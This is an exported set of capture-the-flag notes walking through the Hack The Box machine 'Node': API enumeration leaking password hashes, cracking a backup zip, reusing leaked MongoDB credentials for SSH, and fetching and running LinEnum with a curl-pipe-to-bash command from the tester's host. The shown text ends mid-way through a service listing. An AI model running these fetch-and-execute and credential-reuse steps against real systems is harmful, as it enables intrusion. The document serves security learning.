<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>node</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#node">node</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<li><a href="#http">http</a></li>
<ol>
<li><a href="#page source">page source</a></li>
<ol>
<li><a href="#home.js">home.js</a></li>
<ol>
<li><a href="#/api/users/latest">/api/users/latest</a></li>
</ol>
<li><a href="#admin.js">admin.js</a></li>
<ol>
<li><a href="#/api/admin/backup">/api/admin/backup</a></li>
</ol>
<li><a href="#profile.js">profile.js</a></li>
<ol>
<li><a href="#/api/users ">/api/users </a></li>
</ol>
<li><a href="#login.js">login.js</a></li>
<ol>
<li><a href="#/api/session/authenticate">/api/session/authenticate</a></li>
</ol>
</ol>
<li><a href="#crackstation">crackstation</a></li>
</ol>
<li><a href="#initial foothold on mark">initial foothold on mark</a></li>
<ol>
<li><a href="#backup download">backup download</a></li>
<li><a href="#fcrack">fcrack</a></li>
<ol>
<li><a href="#fcrack brute force">fcrack brute force</a></li>
<li><a href="#unzip myplace.decode.backup">unzip myplace.decode.backup</a></li>
</ol>
<li><a href="#ssh mark">ssh mark</a></li>
</ol>
<li><a href="#privesc to Tom">privesc to Tom</a></li>
<ol>
<li><a href="#linEnum.sh">linEnum.sh</a></li>
<ol>
<li><a href="#report">report</a></li>
<ol>
<li><a href="#system">system</a></li>
<li><a href="#USER/GROUP">USER/GROUP</a></li>
<li><a href="#Environmental">Environmental</a></li>
<li><a href="#JOBS/TASKS">JOBS/TASKS</a></li>
<li><a href="#Networking">Networking</a></li>
<li><a href="#Services">Services</a></li>
<li><a href="#Interesting Files">Interesting Files</a></li>
</ol>
<li><a href="#LinEnum finds:">LinEnum finds:</a></li>
</ol>
<li><a href="#escalation method 1: mongo_db rev shell">escalation method 1: mongo_db rev shell</a></li>
<ol>
<li><a href="#pentest monkey reverse shell ">pentest monkey reverse shell </a></li>
<li><a href="#excalating to Tom w/ reverse shell">excalating to Tom w/ reverse shell</a></li>
</ol>
<li><a href="#escalating method 2: copy privileged shell (ippsec)">escalating method 2: copy privileged shell (ippsec)</a></li>
</ol>
<li><a href="#privesc to root">privesc to root</a></li>
<ol>
<li><a href="#find / -perm -4000 2&gt;/dev/null">find / -perm -4000 2&gt;/dev/null</a></li>
<li><a href="#/usr/local/bin/backup">/usr/local/bin/backup</a></li>
<ol>
<li><a href="#strace ./backup">strace ./backup</a></li>
<li><a href="#radar 2">radar 2</a></li>
<li><a href="#takes 3 arguments">takes 3 arguments</a></li>
<li><a href="#strace">strace</a></li>
<li><a href="#./backup (trolled)">./backup (trolled)</a></li>
</ol>
<li><a href="#badchars">badchars</a></li>
<li><a href="#intended privesc- Buffer Overflow">intended privesc- Buffer Overflow</a></li>
<ol>
<li><a href="#check for overflowed buffer">check for overflowed buffer</a></li>
<li><a href="#pattern create">pattern create</a></li>
<li><a href="#python -c 'print &quot;A&quot;*520'">python -c 'print "A"*520'</a></li>
<li><a href="#buf.py">buf.py</a></li>
<li><a href="#find libc, system_off, exit_off and arg_off starting address">find libc, system_off, exit_off and arg_off starting address</a></li>
<ol>
<li><a href="#/lib32 files">/lib32 files</a></li>
</ol>
<li><a href="#update ret">update ret</a></li>
<li><a href="#run buf.py win">run buf.py win</a></li>
</ol>
<li><a href="#unintended privesc methods">unintended privesc methods</a></li>
<ol>
<li><a href="#avoiding bad characters to extract root.txt">avoiding bad characters to extract root.txt</a></li>
<ol>
<li><a href="#decode and unzip and....">decode and unzip and....</a></li>
</ol>
<li><a href="#creating a symlink">creating a symlink</a></li>
<li><a href="#wildcards">wildcards</a></li>
<li><a href="#command injection">command injection</a></li>
</ol>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>node</u></b></h1><img alt="images/786-1.png" src="images/786-1.png"/><br/><img alt="images/786-2.png" src="images/786-2.png"/></div>
</body></html><div class="page" id="node"><h1><b><u>node</u></b></h1><img alt="images/786-1.png" src="images/786-1.png"/><br/><img alt="images/786-2.png" src="images/786-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><img alt="images/787-1.png" src="images/787-1.png"/><br/><br/><span style="color:#ffa500;">nmap</span><span style="color:#24ff00;"> is reporting port </span><span style="color:#ffa500;">22</span><span style="color:#24ff00;"> is open for </span><span style="color:#ffa500;">ssh</span><span style="color:#24ff00;"> and<br/></span><span style="color:#ffa500;">3000</span><span style="color:#24ff00;"> is open running </span><span style="color:#ffa500;">http</span></div>
<div class="page" id="http"><h1><b><u>http</u></b></h1><img alt="images/1972-1.png" src="images/1972-1.png"/></div>
<div class="page" id="page source"><h1><b><u>page source</u></b></h1><span style="color:#24ff00;">Web page source code doesn't show anything too suspicious, but there are a few </span><span style="color:#ffff00;">javascript</span><span style="color:#24ff00;"> files that may give us some leads on how to initialize a foothold onto the box<br/></span><br/><img alt="images/788-1.png" src="images/788-1.png"/><br/><br/><br/><br/><img alt="images/788-2.png" src="images/788-2.png"/></div>
<div class="page" id="home.js"><h1><b><u>home.js</u></b></h1><span style="color:#24ff00;">/api/users/latest</span><br/><br/><img alt="images/793-1.png" src="images/793-1.png"/><br/><img alt="images/793-2.png" src="images/793-2.png"/></div>
<div class="page" id="/api/users/latest"><h1><b><u>/api/users/latest</u></b></h1><span style="color:#24ff00;">Bingo! we have exposed users </span><span style="color:#ffff00;">tom</span><span style="color:#24ff00;"> and </span><span style="color:#ffff00;">mark</span><span style="color:#24ff00;"> along with their respective </span><span style="color:#ffff00;">password</span> <span style="color:#ffff00;">hashes</span><br/><br/><span style="color:#24ff00;">Taking a look at the password strings all being 64 characters in length, its safe to assume theyre hashes</span><br/><img alt="images/799-1.png" src="images/799-1.png"/><br/></div>
<div class="page" id="admin.js"><h1><b><u>admin.js</u></b></h1><img alt="images/794-1.png" src="images/794-1.png"/><br/><br/><br/><span style="color:#24ff00;">We see the script refers to </span><span style="color:#ffa500;">/api/admin/backup</span><span style="color:#24ff00;">, lets navigate to that URL to see if theres anything interesting</span><br/><img alt="images/794-2.png" src="images/794-2.png"/></div>
<div class="page" id="/api/admin/backup"><h1><b><u>/api/admin/backup</u></b></h1><img alt="images/800-1.png" src="images/800-1.png"/><br/><br/><br/><img alt="images/800-2.png" src="images/800-2.png"/><br/><span style="color:#24ff00;">we get an authentication error = false here, lets move on and maybe revisit if we have the proper credentials...</span><br/></div>
<div class="page" id="profile.js"><h1><b><u>profile.js</u></b></h1><img alt="images/795-1.png" src="images/795-1.png"/><br/><br/><span style="color:#ffa500;">/api/users </span><span style="color:#24ff00;">webpage is used, lets navigate to that webpage URL</span><br/><br/><img alt="images/795-2.png" src="images/795-2.png"/></div>
<div class="page" id="/api/users "><h1><b><u>/api/users </u></b></h1><span style="color:#24ff00;">Bingo! we have exposed </span><span style="color:#ffff00;">users</span><span style="color:#24ff00;"> and </span><span style="color:#ffff00;">passwords</span> <span style="color:#24ff00;">checking the</span><br/><br/><img alt="images/797-1.png" src="images/797-1.png"/></div>
<div class="page" id="login.js"><h1><b><u>login.js</u></b></h1><img alt="images/796-1.png" src="images/796-1.png"/><br/><span style="color:#24ff00;"><br/>seems the script refers to the </span><span style="color:#ffa500;">/api/session/authenticate </span><span style="color:#24ff00;">URL, lets navigate there</span><br/><img alt="images/796-2.png" src="images/796-2.png"/></div>
<div class="page" id="/api/session/authenticate"><h1><b><u>/api/session/authenticate</u></b></h1><span style="color:#24ff00;">andd we get redirected back to the main page</span><br/><img alt="images/798-1.png" src="images/798-1.png"/><br/><br/><img alt="images/798-2.png" src="images/798-2.png"/></div>
<div class="page" id="crackstation"><h1><b><u>crackstation</u></b></h1><span style="color:#24ff00;">lets take these</span><span style="color:#ffff00;"> password hashes </span><br/><img alt="images/790-1.png" src="images/790-1.png"/><img alt="images/790-2.png" src="images/790-2.png"/><br/><br/><img alt="images/790-3.png" src="images/790-3.png"/></div>
<div class="page" id="initial foothold on mark"><h1><b><u>initial foothold on mark</u></b></h1><span style="color:#24ff00;">taking a look at the webpage, we see there's a </span><span style="color:#ffa500;">backup</span><span style="color:#24ff00;"> file we can download, lets save it to our working directory and take a look at it</span><br/><br/><img alt="images/791-1.png" src="images/791-1.png"/><br/><br/><img alt="images/791-2.png" src="images/791-2.png"/><br/><br/><span style="color:#24ff00;">revisiting the </span><span style="color:#ffa500;">/api/admin/backup </span><span style="color:#24ff00;">source code URL from earlier</span><br/><img alt="images/791-3.png" src="images/791-3.png"/><br/><br/><img alt="images/791-4.png" src="images/791-4.png"/><br/><br/><span style="color:#24ff00;">its an incredibly long string that looks like its encoded in </span><span style="color:#ffa500;">base64</span><span style="color:#24ff00;"><br/><br/>this is most likely the same backup string as the one we get once we login as the myplace admin, refer to the myspace admin node<br/> </span></div>
<div class="page" id="backup download"><h1><b><u>backup download</u></b></h1><img alt="images/792-1.png" src="images/792-1.png"/><span style="color:#24ff00;"><br/>first lets move the backup file to our node directory:<br/></span><img alt="images/792-2.png" src="images/792-2.png"/><br/><br/>and check our what type of <span style="color:#ffa500;">file</span><span style="color:#24ff00;"> it is:<br/></span><span style="color:#ffa500;">file myplace.backup</span><br/><img alt="images/792-3.png" src="images/792-3.png"/><br/><br/>file reports its ascii with very long lines, but lets take a look at the first 100 characters with the <span style="color:#ffa500;">head</span><span style="color:#24ff00;"> command <br/></span><span style="color:#ffa500;">head -c100 myplace.backup</span><br/><img alt="images/792-4.png" src="images/792-4.png"/><br/><br/>it looks like <span style="color:#ffff00;">base64</span><span style="color:#24ff00;">, lets decode it and run </span><span style="color:#ffa500;">file</span><span style="color:#24ff00;"> on myspace.backup again<br/></span><span style="color:#ffa500;">cat myplace.backup | base64 -d &gt; myplace.decoded.backup<br/>file myplace.decoded.backup</span><br/><img alt="images/792-5.png" src="images/792-5.png"/><br/><img alt="images/792-6.png" src="images/792-6.png"/><br/><br/>and we see its a <span style="color:#ffa500;">zip</span><span style="color:#24ff00;"> file! lets </span><span style="color:#ffa500;">unzip</span><span style="color:#24ff00;"> it<br/></span><img alt="images/792-7.png" src="images/792-7.png"/><br/><br/>its <span style="color:#ff0000;">password protected</span><span style="color:#24ff00;">, time to bust out the brute force tool </span><span style="color:#ffa500;">fcrack</span><span style="color:#24ff00;"> <br/><br/><br/><br/><br/><br/></span></div>
<div class="page" id="fcrack"><h1><b><u>fcrack</u></b></h1><span style="color:#24ff00;">usage </span><br/><img alt="images/802-1.png" src="images/802-1.png"/></div>
<div class="page" id="fcrack brute force"><h1><b><u>fcrack brute force</u></b></h1><span style="color:#ffa500;">fcrackzip -b -D -p /usr/share/wordlists/rockyou.txt myplace.decoded.backup</span><br/><span style="color:#24ff00;">where </span><br/><span style="color:#ffa500;">-b </span><span style="color:#24ff00;">sets fcrackzip to brute-force mode<br/></span><span style="color:#ffa500;">-D </span><span style="color:#24ff00;">specifies dictionary attack<br/></span><span style="color:#ffa500;">-p</span><span style="color:#24ff00;"> for password file we'll use </span><span style="color:#ffa500;">rockyou.txt</span><br/><br/><img alt="images/803-1.png" src="images/803-1.png"/><br/><br/><img alt="images/803-2.png" src="images/803-2.png"/><br/><br/></div>
<div class="page" id="unzip myplace.decode.backup"><h1><b><u>unzip myplace.decode.backup</u></b></h1><span style="color:#24ff00;">if we look at </span><span style="color:#ffa500;">app.js</span><span style="color:#24ff00;"> we see that there are leaked credentials in the const url file,</span><br/><br/><br/><span style="color:#ffa500;">const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace';<br/>const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';</span><br/><img alt="images/804-1.png" src="images/804-1.png"/><br/><br/><span style="color:#24ff00;">we can also sift through the backup with </span><span style="color:#ffa500;">grep</span><span style="color:#24ff00;">:</span><br/><br/><span style="color:#ffa500;">grep -Ri mongo</span><br/><span style="color:#24ff00;">where<br/></span><span style="color:#ffa500;">-R</span><span style="color:#24ff00;"> recursive<br/></span><span style="color:#ffa500;">-i </span><span style="color:#24ff00;">is case insensitive<br/></span><span style="color:#ffa500;">mongo</span><span style="color:#24ff00;"> is the string we're searching</span><br/><img alt="images/804-2.png" src="images/804-2.png"/><br/><img alt="images/804-3.png" src="images/804-3.png"/><br/><br/><span style="color:#24ff00;">we can sift through an output like this, but since we know mark's mongodb credentials, lets see if he reused his mongo pw with his ssh password</span><br/><span style="color:#ffff00;">5AYRft73VtFpc84k</span></div>
<div class="page" id="ssh mark"><h1><b><u>ssh mark</u></b></h1><span style="color:#24ff00;">lets try the mongo creds we got and try to ssh into either mark or tom...</span><br/><span style="color:#ffff00;">5AYRft73VtFpc84k</span><br/><br/><img alt="images/805-1.png" src="images/805-1.png"/><br/><img alt="images/805-2.png" src="images/805-2.png"/><br/><br/><span style="color:#24ff00;">We're in!<br/>but the user that has privileges to our</span><span style="color:#ffa500;"> user.txt</span><span style="color:#24ff00;"> flag is Tom<br/></span><img alt="images/805-3.png" src="images/805-3.png"/><br/>so we get permission denial </div>
<div class="page" id="privesc to Tom"><h1><b><u>privesc to Tom</u></b></h1></div>
<div class="page" id="linEnum.sh"><h1><b><u>linEnum.sh</u></b></h1><span style="color:#24ff00;">lets run </span><span style="color:#ffa500;">linEnum</span><span style="color:#24ff00;"> and see what we get<br/><br/>first spin up an http server:<br/></span><img alt="images/807-1.png" src="images/807-1.png"/><br/><br/>and dl LinEnum.sh from our victim<br/><span style="color:#ffa500;">wget 10.10.14.62/LinEnum.sh</span><br/><img alt="images/807-2.png" src="images/807-2.png"/><br/><br/><span style="color:#24ff00;">dont have privilege to download and run </span><span style="color:#ffa500;">LinEnum.sh</span><span style="color:#24ff00;">, lets try curl and pipe that to bash</span><br/><span style="color:#ffa500;">curl 10.10.14.62/LinEnum.sh | bash</span><br/><img alt="images/807-3.png" src="images/807-3.png"/><br/><br/></div>
<div class="page" id="report"><h1><b><u>report</u></b></h1><img alt="images/808-1.png" src="images/808-1.png"/><br/><br/></div>
<div class="page" id="system"><h1><b><u>system</u></b></h1><img alt="images/809-1.png" src="images/809-1.png"/><br/><br/><br/><img alt="images/809-2.png" src="images/809-2.png"/></div>
<div class="page" id="USER/GROUP"><h1><b><u>USER/GROUP</u></b></h1><img alt="images/810-1.png" src="images/810-1.png"/><br/><br/><img alt="images/810-2.png" src="images/810-2.png"/><br/><br/><img alt="images/810-3.png" src="images/810-3.png"/><br/><br/><img alt="images/810-4.png" src="images/810-4.png"/><br/><br/><img alt="images/810-5.png" src="images/810-5.png"/></div>
<div class="page" id="Environmental"><h1><b><u>Environmental</u></b></h1><img alt="images/811-1.png" src="images/811-1.png"/><br/><img alt="images/811-2.png" src="images/811-2.png"/><br/><img alt="images/811-3.png" src="images/811-3.png"/><br/></div>
<div class="page" id="JOBS/TASKS"><h1><b><u>JOBS/TASKS</u></b></h1><img alt="images/812-1.png" src="images/812-1.png"/><br/><img alt="images/812-2.png" src="images/812-2.png"/><br/><br/><img alt="images/812-3.png" src="images/812-3.png"/><br/><img alt="images/812-4.png" src="images/812-4.png"/><br/><br/><br/></div>
<div class="page" id="Networking"><h1><b><u>Networking</u></b></h1><img alt="images/813-1.png" src="images/813-1.png"/></div>
<div class="page" id="Services"><h1><b><u>Services</u></b></h1><img alt="images/815-1.png" src="images/815-1.png"/><h2><br/><div class="codebox"><div style="background-color: #001b33 ; padding: 10px; border: 1px solid green;">
drwxr-xr-x 2 root root 4.0K Aug 29  2017 reboot.target.wants<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 sysinit.target.wants<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 sockets.target.wants<br/>lrwxrwxrwx 1 root root   16 Aug 29  2017 runlevel5.target -&gt; graphical.target<br/>lrwxrwxrwx 1 root root   13 Aug 29  2017 runlevel6.target -&gt; reboot.target<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 sendsigs.service -&gt; /dev/null<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 sigpwr.target.wants<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 single.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 stop-bootlogd.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 stop-bootlogd-single.service -&gt; /dev/null<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 systemd-resolved.service.d<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 systemd-timesyncd.service.d<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 timers.target.wants<br/>lrwxrwxrwx 1 root root   21 Aug 29  2017 udev.service -&gt; systemd-udevd.service<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 umountfs.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 umountnfs.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 umountroot.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root   27 Aug 29  2017 urandom.service -&gt; systemd-random-seed.service<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 x11-common.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 killprocs.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root   28 Aug 29  2017 kmod.service -&gt; systemd-modules-load.service<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 local-fs.target.wants<br/>lrwxrwxrwx 1 root root   28 Aug 29  2017 module-init-tools.service -&gt; systemd-modules-load.service<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 motd.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 mountall-bootclean.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 mountall.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 mountdevsubfs.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 mountkernfs.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 mountnfs-bootclean.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 mountnfs.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root   22 Aug 29  2017 procps.service -&gt; systemd-sysctl.service<br/>lrwxrwxrwx 1 root root   16 Aug 29  2017 rc.local.service -&gt; rc-local.service<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 rc-local.service.d<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 rc.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 rcS.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 reboot.service -&gt; /dev/null<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 rescue.target.wants<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 resolvconf.service.wants<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 rmnologin.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root   15 Aug 29  2017 runlevel0.target -&gt; poweroff.target<br/>lrwxrwxrwx 1 root root   13 Aug 29  2017 runlevel1.target -&gt; rescue.target<br/>lrwxrwxrwx 1 root root   17 Aug 29  2017 runlevel2.target -&gt; multi-user.target<br/>lrwxrwxrwx 1 root root   17 Aug 29  2017 runlevel3.target -&gt; multi-user.target<br/>lrwxrwxrwx 1 root root   17 Aug 29  2017 runlevel4.target -&gt; multi-user.target<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 checkfs.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 checkroot-bootclean.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 checkroot.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 cryptdisks-early.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 cryptdisks.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root   13 Aug 29  2017 ctrl-alt-del.target -&gt; reboot.target<br/>lrwxrwxrwx 1 root root   25 Aug 29  2017 dbus-org.freedesktop.hostname1.service -&gt; systemd-hostnamed.service<br/>lrwxrwxrwx 1 root root   23 Aug 29  2017 dbus-org.freedesktop.locale1.service -&gt; systemd-localed.service<br/>lrwxrwxrwx 1 root root   22 Aug 29  2017 dbus-org.freedesktop.login1.service -&gt; systemd-logind.service<br/>lrwxrwxrwx 1 root root   24 Aug 29  2017 dbus-org.freedesktop.network1.service -&gt; systemd-networkd.service<br/>lrwxrwxrwx 1 root root   24 Aug 29  2017 dbus-org.freedesktop.resolve1.service -&gt; systemd-resolved.service<br/>lrwxrwxrwx 1 root root   25 Aug 29  2017 dbus-org.freedesktop.timedate1.service -&gt; systemd-timedated.service<br/>lrwxrwxrwx 1 root root   16 Aug 29  2017 default.target -&gt; graphical.target<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 fuse.service -&gt; /dev/null<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 getty.target.wants<br/>drwxr-xr-x 2 root root 4.0K Aug 29  2017 graphical.target.wants<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 halt.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 hostname.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 hwclock.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root   14 Aug 29  2017 autovt@.service -&gt; getty@.service<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 bootlogd.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 bootlogs.service -&gt; /dev/null<br/>lrwxrwxrwx 1 root root    9 Aug 29  2017 bootmisc.service -&gt; /dev/null<br/>-rw-r--r-- 1 root root  683 Aug 23  2017 lxd.service<br/>-rw-r--r-- 1 root root  206 Aug 23  2017 lxd-bridge.service<br/>-rw-r--r-- 1 root root  318 Aug 23  2017 lxd-containers.service<br/>-rw-r--r-- 1 root root  197 Aug 23  2017 lxd.socket<br/>drwxr-xr-x 2 root root 4.0K Aug  1  2017 busnames.target.wants<br/>-rw-r--r-- 1 root root  879 Jul 19  2017 basic.target<br/>-rw-r--r-- 1 root root  379 Jul 19  2017 bluetooth.target<br/>-rw-r--r-- 1 root root  358 Jul 19  2017 busnames.target<br/>-rw-r--r-- 1 root root  770 Jul 19  2017 console-getty.service<br/>-rw-r--r-- 1 root root  742 Jul 19  2017 console-shell.service<br/>-rw-r--r-- 1 root root  791 Jul 19  2017 container-getty@.service<br/>-rw-r--r-- 1 root root  394 Jul 19  2017 cryptsetup-pre.target<br/>-rw-r--r-- 1 root root  366 Jul 19  2017 cryptsetup.target<br/>-rw-r--r-- 1 root root 1010 Jul 19  2017 debug-shell.service<br/>-rw-r--r-- 1 root root  670 Jul 19  2017 dev-hugepages.mount<br/>-rw-r--r-- 1 root root  624 Jul 19  2017 dev-mqueue.mount<br/>-rw-r--r-- 1 root root 1009 Jul 19  2017 emergency.service<br/>-rw-r--r-- 1 root root  431 Jul 19  2017 emergency.target<br/>-rw-r--r-- 1 root root  501 Jul 19  2017 exit.target<br/>-rw-r--r-- 1 root root  440 Jul 19  2017 final.target<br/>-rw-r--r-- 1 root root 1.5K Jul 19  2017 getty@.service<br/>-rw-r--r-- 1 root root  460 Jul 19  2017 getty.target<br/>-rw-r--r-- 1 root root  558 Jul 19  2017 graphical.target<br/>-rw-r--r-- 1 root root  487 Jul 19  2017 halt.target<br/>-rw-r--r-- 1 root root  447 Jul 19  2017 hibernate.target<br/>-rw-r--r-- 1 root root  468 Jul 19  2017 hybrid-sleep.target<br/>-rw-r--r-- 1 root root  630 Jul 19  2017 initrd-cleanup.service<br/>-rw-r--r-- 1 root root  553 Jul 19  2017 initrd-fs.target<br/>-rw-r--r-- 1 root root  790 Jul 19  2017 initrd-parse-etc.service<br/>-rw-r--r-- 1 root root  526 Jul 19  2017 initrd-root-fs.target<br/>-rw-r--r-- 1 root root  640 Jul 19  2017 initrd-switch-root.service<br/>-rw-r--r-- 1 root root  691 Jul 19  2017 initrd-switch-root.target<br/>-rw-r--r-- 1 root root  671 Jul 19  2017 initrd.target<br/>-rw-r--r-- 1 root root  664 Jul 19  2017 initrd-udevadm-cleanup-db.service<br/>-rw-r--r-- 1 root root  501 Jul 19  2017 kexec.target<br/>-rw-r--r-- 1 root root  677 Jul 19  2017 kmod-static-nodes.service<br/>-rw-r--r-- 1 root root  395 Jul 19  2017 local-fs-pre.target<br/>-rw-r--r-- 1 root root  507 Jul 19  2017 local-fs.target<br/>-rw-r--r-- 1 root root  405 Jul 19  2017 machine.slice<br/>-rw-r--r-- 1 root root  473 Jul 19  2017 mail-transport-agent.target<br/>-rw-r--r-- 1 root root  492 Jul 19  2017 multi-user.target<br/>-rw-r--r-- 1 root root  464 Jul 19  2017 network-online.target<br/>-rw-r--r-- 1 root root  461 Jul 19  2017 network-pre.target<br/>-rw-r--r-- 1 root root  480 Jul 19  2017 network.target<br/>-rw-r--r-- 1 root root  514 Jul 19  2017 nss-lookup.target<br/>-rw-r--r-- 1 root root  473 Jul 19  2017 nss-user-lookup.target<br/>-rw-r--r-- 1 root root  354 Jul 19  2017 paths.target<br/>-rw-r--r-- 1 root root  552 Jul 19  2017 poweroff.target<br/>-rw-r--r-- 1 root root  377 Jul 19  2017 printer.target<br/>-rw-r--r-- 1 root root  693 Jul 19  2017 proc-sys-fs-binfmt_misc.automount<br/>-rw-r--r-- 1 root root  603 Jul 19  2017 proc-sys-fs-binfmt_misc.mount<br/>-rw-r--r-- 1 root root  568 Jul 19  2017 quotaon.service<br/>-rw-r--r-- 1 root root  612 Jul 19  2017 rc-local.service<br/>-rw-r--r-- 1 root root  543 Jul 19  2017 reboot.target<br/>-rw-r--r-- 1 root root  396 Jul 19  2017 remote-fs-pre.target<br/>-rw-r--r-- 1 root root  482 Jul 19  2017 remote-fs.target<br/>-rw-r--r-- 1 root root  978 Jul 19  2017 rescue.service<br/>-rw-r--r-- 1 root root  486 Jul 19  2017 rescue.target<br/>-rw-r--r-- 1 root root  500 Jul 19  2017 rpcbind.target<br/>-rw-r--r-- 1 root root 1.1K Jul 19  2017 serial-getty@.service<br/>-rw-r--r-- 1 root root  402 Jul 19  2017 shutdown.target<br/>-rw-r--r-- 1 root root  362 Jul 19  2017 sigpwr.target<br/>-rw-r--r-- 1 root root  420 Jul 19  2017 sleep.target<br/>-rw-r--r-- 1 root root  403 Jul 19  2017 -.slice<br/>-rw-r--r-- 1 root root  409 Jul 19  2017 slices.target<br/>-rw-r--r-- 1 root root  380 Jul 19  2017 smartcard.target<br/>-rw-r--r-- 1 root root  356 Jul 19  2017 sockets.target<br/>-rw-r--r-- 1 root root  380 Jul 19  2017 sound.target<br/>-rw-r--r-- 1 root root  441 Jul 19  2017 suspend.target<br/>-rw-r--r-- 1 root root  353 Jul 19  2017 swap.target<br/>-rw-r--r-- 1 root root  715 Jul 19  2017 sys-fs-fuse-connections.mount<br/>-rw-r--r-- 1 root root  518 Jul 19  2017 sysinit.target<br/>-rw-r--r-- 1 root root  719 Jul 19  2017 sys-kernel-config.mount<br/>-rw-r--r-- 1 root root  662 Jul 19  2017 sys-kernel-debug.mount<br/>-rw-r--r-- 1 root root 1.3K Jul 19  2017 syslog.socket<br/>-rw-r--r-- 1 root root  646 Jul 19  2017 systemd-ask-password-console.path<br/>-rw-r--r-- 1 root root  653 Jul 19  2017 systemd-ask-password-console.service<br/>-rw-r--r-- 1 root root  574 Jul 19  2017 systemd-ask-password-wall.path<br/>-rw-r--r-- 1 root root  681 Jul 19  2017 systemd-ask-password-wall.service<br/>-rw-r--r-- 1 root root  724 Jul 19  2017 systemd-backlight@.service<br/>-rw-r--r-- 1 root root  959 Jul 19  2017 systemd-binfmt.service<br/>-rw-r--r-- 1 root root  650 Jul 19  2017 systemd-bootchart.service<br/>-rw-r--r-- 1 root root 1.0K Jul 19  2017 systemd-bus-proxyd.service<br/>-rw-r--r-- 1 root root  409 Jul 19  2017 systemd-bus-proxyd.socket<br/>-rw-r--r-- 1 root root  497 Jul 19  2017 systemd-exit.service<br/>-rw-r--r-- 1 root root  551 Jul 19  2017 systemd-fsckd.service<br/>-rw-r--r-- 1 root root  540 Jul 19  2017 systemd-fsckd.socket<br/>-rw-r--r-- 1 root root  674 Jul 19  2017 systemd-fsck-root.service<br/>-rw-r--r-- 1 root root  648 Jul 19  2017 systemd-fsck@.service<br/>-rw-r--r-- 1 root root  544 Jul 19  2017 systemd-halt.service<br/>-rw-r--r-- 1 root root  631 Jul 19  2017 systemd-hibernate-resume@.service<br/>-rw-r--r-- 1 root root  501 Jul 19  2017 systemd-hibernate.service<br/>-rw-r--r-- 1 root root  710 Jul 19  2017 systemd-hostnamed.service<br/>-rw-r--r-- 1 root root  778 Jul 19  2017 systemd-hwdb-update.service<br/>-rw-r--r-- 1 root root  519 Jul 19  2017 systemd-hybrid-sleep.service<br/>-rw-r--r-- 1 root root  480 Jul 19  2017 systemd-initctl.service<br/>-rw-r--r-- 1 root root  524 Jul 19  2017 systemd-initctl.socket<br/>-rw-r--r-- 1 root root  607 Jul 19  2017 systemd-journald-audit.socket<br/>-rw-r--r-- 1 root root 1.1K Jul 19  2017 systemd-journald-dev-log.socket<br/>-rw-r--r-- 1 root root 1.3K Jul 19  2017 systemd-journald.service<br/>-rw-r--r-- 1 root root  842 Jul 19  2017 systemd-journald.socket<br/>-rw-r--r-- 